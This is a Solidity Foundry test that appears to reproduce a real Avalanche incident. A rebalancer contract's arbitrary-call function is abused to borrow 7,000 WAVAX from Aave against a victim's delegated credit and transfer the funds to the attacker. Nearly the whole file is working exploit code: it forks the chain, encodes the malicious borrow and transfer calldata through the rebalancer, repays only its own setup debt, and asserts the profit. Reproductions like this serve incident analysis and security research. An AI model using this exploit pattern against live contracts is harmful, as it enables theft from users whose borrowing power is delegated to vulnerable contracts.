// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 6,999.91 WAVAX
// Attacker : 0xf59dc5521f191bcb53a9bcbd1654be81b72ee96f
// Attack Contract : 0xe44eea4c6c2085d590a4a6bea01cf83e87a37be5
// Vulnerable Contract : 0x7a7bab45363efb0394ff27bfa29bb7c0534ca8c9
// Attack Tx : https://snowscan.xyz/tx/0xaaa1b2e561738399af890dde2b18252b698e9b0ae7c8430fdd855f426835001b

// @Info
// Vulnerable Contract Code : https://snowscan.xyz/address/0x7a7bab45363efb0394ff27bfa29bb7c0534ca8c9#code
// Aave Pool Proxy : https://snowscan.xyz/address/0x794a61358d6845594f94dc1db02a252b5b4814ad#code
// Aave Pool Implementation : https://snowscan.xyz/address/0x6cddff90124ba51afac5715314db7c9546b32204#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2046504796463808991
//
// The rebalancer executes caller-supplied target/data from its own address. The attacker used that surface to
// call Aave Pool.borrow(WAVAX, 7000e18, 2, 0, victim). Aave accepted the borrow because the victim had delegated
// WAVAX borrowing power to the rebalancer, minting variable WAVAX debt to the victim and sending WAVAX to the
// rebalancer. A second arbitrary call transferred the acquired WAVAX out.

address constant ATTACKER = 0xf59dc5521f191Bcb53a9bcBD1654Be81B72EE96F;
address constant ATTACK_CONTRACT = 0xe44EEa4C6C2085D590A4a6BeA01CF83E87A37bE5;
address constant VULNERABLE_REBALANCER = 0x7A7bAB45363Efb0394Ff27bfA29bb7C0534cA8C9;
address constant VICTIM = 0x6fDAE9edACc6461b21f71a1a6a420197D2b0C3aa;
address constant AAVE_POOL = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
address constant WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
address constant SAVAX = 0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE;
address constant USDC_TOKEN = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;
address constant VARIABLE_DEBT_WAVAX = 0x4a1c3aD6Ed28a636ee1751C69071f6be75DEb8B8;

interface IVariableDebtToken {
    function approveDelegation(address delegatee, uint256 amount) external;
    function borrowAllowance(address fromUser, address toUser) external view returns (uint256);
    function balanceOf(address user) external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    IAaveFlashloan private constant pool = IAaveFlashloan(AAVE_POOL);
    IERC20 private constant wavax = IERC20(WAVAX);
    IERC20 private constant savax = IERC20(SAVAX);
    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IVariableDebtToken private constant variableDebtWavax = IVariableDebtToken(VARIABLE_DEBT_WAVAX);

    function setUp() public {
        uint256 forkBlock = 83_324_252;
        vm.createSelectFork("avalanche", forkBlock);

        vm.label(ATTACKER, "Attacker / Profit Receiver");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VULNERABLE_REBALANCER, "Vulnerable sAVAX Rebalancer");
        vm.label(VICTIM, "Victim");
        vm.label(AAVE_POOL, "Aave V3 Pool");
        vm.label(WAVAX, "WAVAX");
        vm.label(SAVAX, "sAVAX");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(VARIABLE_DEBT_WAVAX, "variableDebtAvaWAVAX");
    }

    function testExploit() public {
        uint256 victimDebtBefore = variableDebtWavax.balanceOf(VICTIM);
        uint256 attackerWavaxBefore = wavax.balanceOf(ATTACKER);
        uint256 delegatedBorrowAllowance = variableDebtWavax.borrowAllowance(VICTIM, VULNERABLE_REBALANCER);
        assertEq(delegatedBorrowAllowance, type(uint256).max);

        uint256 setupBorrowAmount = 0.01 ether;
        uint256 savaxDepositPerRebalance = 0.001 ether;
        uint256 maliciousBorrowAmount = 7_000 ether;

        // step 1: create the tiny local Aave position needed for the rebalancer's normal borrow path.
        deal(USDC_TOKEN, address(this), 1e6);
        deal(SAVAX, address(this), 2 * savaxDepositPerRebalance);
        usdc.approve(AAVE_POOL, type(uint256).max);
        wavax.approve(AAVE_POOL, type(uint256).max);
        pool.supply(USDC_TOKEN, 1e6, address(this), 0);
        variableDebtWavax.approveDelegation(VULNERABLE_REBALANCER, type(uint256).max);

        // step 2: execute the victim-funded Aave borrow from the historical rebalancer address.
        savax.transfer(VULNERABLE_REBALANCER, savaxDepositPerRebalance);
        bytes memory borrowFromVictim = abi.encodeWithSelector(
            pool.borrow.selector,
            WAVAX,
            maliciousBorrowAmount,
            2,
            0,
            VICTIM
        );
        _callRebalancer(setupBorrowAmount, AAVE_POOL, borrowFromVictim);

        // step 3: make the same arbitrary-call surface transfer the acquired WAVAX out to this PoC.
        savax.transfer(VULNERABLE_REBALANCER, savaxDepositPerRebalance);
        uint256 amountAvailableAfterSecondSetupBorrow = wavax.balanceOf(VULNERABLE_REBALANCER) + setupBorrowAmount;
        bytes memory pullWavax = abi.encodeWithSelector(wavax.transfer.selector, address(this), amountAvailableAfterSecondSetupBorrow);
        _callRebalancer(setupBorrowAmount, WAVAX, pullWavax);

        // step 4: repay only the PoC's own small setup debt, leaving the victim-funded debt increase as impact.
        uint256 localSetupDebt = variableDebtWavax.balanceOf(address(this));
        pool.repay(WAVAX, localSetupDebt, 2, address(this));

        uint256 profit = wavax.balanceOf(address(this));
        wavax.transfer(ATTACKER, profit);

        uint256 victimDebtIncrease = variableDebtWavax.balanceOf(VICTIM) - victimDebtBefore;
        uint256 attackerProfit = wavax.balanceOf(ATTACKER) - attackerWavaxBefore;
        emit log_named_decimal_uint("Victim variable WAVAX debt increase", victimDebtIncrease, 18);
        emit log_named_decimal_uint("Final WAVAX profit", attackerProfit, 18);
        assertGt(victimDebtIncrease, maliciousBorrowAmount);
        assertGt(attackerProfit, 6_999 ether);
    }

    function _callRebalancer(uint256 amount, address target, bytes memory data) private {
        // Selector 0xb2a13230 decodes in the attack tx as (uint256 amount, address target, bytes data, bool flag).
        (bool ok, bytes memory returnData) =
            VULNERABLE_REBALANCER.call(abi.encodeWithSelector(bytes4(0xb2a13230), amount, target, data, true));
        if (!ok) {
            assembly {
                revert(add(returnData, 0x20), mload(returnData))
            }
        }
    }
}
